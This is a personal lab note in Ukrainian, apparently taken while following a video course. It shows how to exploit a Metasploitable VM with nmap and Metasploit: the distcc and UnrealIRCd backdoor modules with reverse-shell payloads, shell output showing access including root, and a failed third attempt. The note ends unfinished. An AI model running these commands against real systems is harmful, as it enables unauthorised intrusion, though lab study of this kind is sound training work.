---
title: "Name                           Disclosure Date  Rank       Check  Description"
category: "networking"
tags: ['expoitation', 'злому', 'eternalblue', 'приклади', 'challende']
status: "published"
created: "2026-03-24"
updated: "2026-03-24"
ai-processed: false
source: "manual"
quality: 1
related-files: []
---

﻿
1  ----------
2 Звязки : [[приклади для злому цілі (3 приклади)]],[[атака SSH -(атака повним перебором) -приклади для злому цілі (приклад 5)]] , [[приклади для злому цілі (приклад 4)]]
3 Теги : [[Expoitation Challende ще 5 різних експлойтів]], [[Eternal Blue Attack  (eternalblue)]]
використаю [[сканування]] всіх 65000 з хуєм портів (викоиставш ключ **-р-** в скануванні [[nmap]] -sV 192.168.1.58 ): 
nmap -sV 192.168.1.58 -p-
nmap -sV 192.168.1.58  -p- 
в другому терміналі відкрию консоль метасплоіту :
msfconsole
повертаюсь до результатів сканування і вибираю експлоїт:
3632/tcp  open  distccd  
запускаю його в терміналі метастлойту:
search distc
я ортимаю лише один доступний експлоіт, але з відмінними шансами **excellent**: 
#  Name                           Disclosure Date  Rank       Check  Description
   -  ----                           ---------------  ----       -----  -----------
   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution
    копіюю цей експлоіт:
    
exploit/unix/misc/distcc_exec
потім запускаю командою use:
use exploit/unix/misc/distcc_exec
дивиьось на параметри відображення :
show options
установлюєм параметри хоста в якості нащого метакористувача:
set RHOST 192.168.1.58
дивимось корисну нагрузку:
show payloads
і до прикладу скористаємось ось цією:
payload/cmd/unix/reverse  
і введемо  установимо командою set:
set  payload /cmd/unix/reverse  
знов дивимося параметри відображення:
show options
деколи може не поставити автоматично параметри LHOST,
якщо не поставило автоматично то вводимо командою set:
попередньо скориставшись командою ifconfig( в цьому випадку це для визначення параметрів домашнього хоста)
set LHOST 192.168.1.95
далі запускаємо:
run
почергово вводимо команди і дізнаємось інформацію:
це вивід команд і відповідей з командного рядка
hoami
daemon
ls
4537.jsvc_up
gconfd-msfadmin
orbit-msfadmin
pwd
/tmp
hostname
metasploitable
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
## друга вразливість

можна побачити в результатах сканування 

nmap -sV 192.168.1.58 -p-
що оцей (нереальний)  сервіс що вразливий до якогось виду атаки:
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
якщо в новому терміналі набрати :
searchsploit irc  
то серед дохрена інфи  це майже нічого не дасть
краще скопіювати версію UnrealIRCd
і в вікні терміналу набрати:

searchsploit UnrealIRCd  
то звузимо пошук до чотирьох результатів один з яких зразу відкидаємо(останній т.я. цу якесь відмовлення в віддаленому обслуговуванні) і користуємось тим що має розширення рубі rb

тепер якшо пошукати його всередині фреймворку метасплоіт(де малюнок):
search UnrealIRCd 
то отримую лише один метасплоіт (з відкр дверями backdoor)з відмінними шансами
Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/irc/unreal_ircd_3281_backdoor
якщо його скопіювати ш заюзати в цьому ж вікні 
use exploit/unix/irc/unreal_ircd_3281_backdoor
то переходжу в нього і можна приміняти стандартну схему:
- подивитися інфу:
show info
- подивитися опції(побачу що не встановлено хоста того що зломуєм)
show options
- встановити хост :
 set RHOST 192.168.1.58
 - пеоевірити опції:
 show options
 - подивитися корисне навантаження:
 show payloads
 бсеред інших бачу те ж що і в попередньлму випадку:
 payload/cmd/unix/reverse 
 - встановити корисне навантаження:
 set payload payload/cmd/unix/reverse 
- встановити LHOST в якості ІР адреси нашої ос системи калі лінукс(адресу своєї машини(в мене зараз відкрита в вірт боксі))
set LHOST 192.168.1.95
- знов пеоевірити опції:
 show options
 - запустити: 
 run
 бачу що все ок і приступаю до кікнцевого блоку команд:
 whoami
 і зразу бачу що я рут
 hostname
 отримуємо:metasploitable
 
 ## третя вразливість
 один з отриманих вище результатів сканування :
 8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
 якщо ввести пошук по імені сервісу в терміналі (новому) drb:
 searchploit drb
 як і завжди отримую кілька (як в цьому випадку)або дуже багато(в попередніх випадках) результатів ніяк не повязаних з фреймворком метастлоіт
перевіряю в вікні фреймворку иетасплоіт там де юзався бекдор в випадку вище: ось командний рядок фреймворку:
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor 
вньому вводимо пошук :
search drb
копіюю експлойт (тут вже йде не так як в ролику але похуй):

exploit/multi/misc/wireshark_lwres_getaddrbyname  
і запускаю:
use exploit/multi/misc/wireshark_lwres_getaddrbyname  
## починається знов стандартна процедура 

show options
бачу що не встановлений RHOSTS . встановлюю:
set  RHOSTS 192.168.1.58
ш запускаю але отримую хуй(тут щось не те з уксплойтом. на відео інакший)

## інший спосіб
якщо поглянути порт 1099 то побачимо що він працює на java-rmi


https://www.youtube.com/watch?v=CE5xXF6YNto&list=PLrNhNTukZ_nF4GlvuniZJGC5cdfYDI0z7&index=53